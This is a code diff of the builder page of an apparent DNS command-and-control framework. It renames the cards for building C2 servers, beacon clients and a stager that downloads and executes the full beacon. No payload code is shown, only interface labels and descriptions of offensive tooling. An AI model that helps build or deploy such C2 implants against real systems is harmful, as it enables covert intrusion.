@@ -322,7 +322,7 @@
         <div class="builder-grid">
             <!-- DNS Server Builder -->
             <div class="builder-card">
-                <div class="builder-title">Prefect Server</div>
+                <div class="builder-title">DNS-Server Server</div>
                 <div class="builder-description">
                     Build a new DNS C2 server for a specific domain. The server will connect to this Archon and handle beacon communications. Ensure you configure glue records.
                 </div>
@@ -356,12 +356,12 @@
                     </div>
                 </div>
 
-                <button class="btn-build" onclick="buildDNSServer()">Build Prefect Server</button>
+                <button class="btn-build" onclick="buildDNSServer()">Build DNS-Server</button>
             </div>
 
             <!-- Client Builder -->
             <div class="builder-card">
-                <div class="builder-title">Vessel</div>
+                <div class="builder-title">Beacon Client</div>
                 <div class="builder-description">
                     Build a beacon client that will connect to your registered DNS servers. Clients will automatically rotate through available domains.
                 </div>
@@ -412,12 +412,12 @@
                     </div>
                 </div>
 
-                <button class="btn-build" onclick="buildClient()">Build Vessel</button>
+                <button class="btn-build" onclick="buildClient()">Build Beacon Client</button>
             </div>
 
             <!-- Stager Builder -->
             <div class="builder-card">
-                <div class="builder-title">Herald</div>
+                <div class="builder-title">Stager</div>
                 <div class="builder-description">
                     Build a DNS-based stager that downloads and executes the full beacon. Used for initial access with minimal footprint.
                 </div>
@@ -470,7 +470,7 @@
                     </div>
                 </div>
 
-                <button class="btn-build" onclick="buildStager()">Build Herald</button>
+                <button class="btn-build" onclick="buildStager()">Build Stager</button>
             </div>
         </div>
 
@@ -834,9 +834,9 @@
 
                 let html = '';
                 const typeNames = {
-                    'dns-server': '🌐 DNS Servers',
-                    'client': '💻 Clients',
-                    'stager': '🚀 Stagers'
+                    'dns-server': 'DNS Servers',
+                    'client': 'Clients',
+                    'stager': 'Stagers'
                 };
 
                 for (const [type, items] of Object.entries(grouped)) {
